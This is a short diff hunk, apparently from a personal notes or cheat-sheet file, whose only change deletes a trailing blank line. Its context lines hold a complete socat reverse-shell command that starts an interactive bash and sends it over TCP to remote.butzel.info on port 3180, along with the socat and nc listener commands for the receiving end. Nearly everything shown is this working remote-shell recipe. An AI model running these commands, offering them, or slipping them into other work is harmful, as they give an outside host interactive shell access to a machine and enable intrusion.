@@ -35,4 +35,3 @@ socat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180
 # listener for above reverse shell (on remote.butzel.info):
 socat file:`tty`,raw,echo=0 tcp-listen:3180
 # or: nc -lp 3180
-
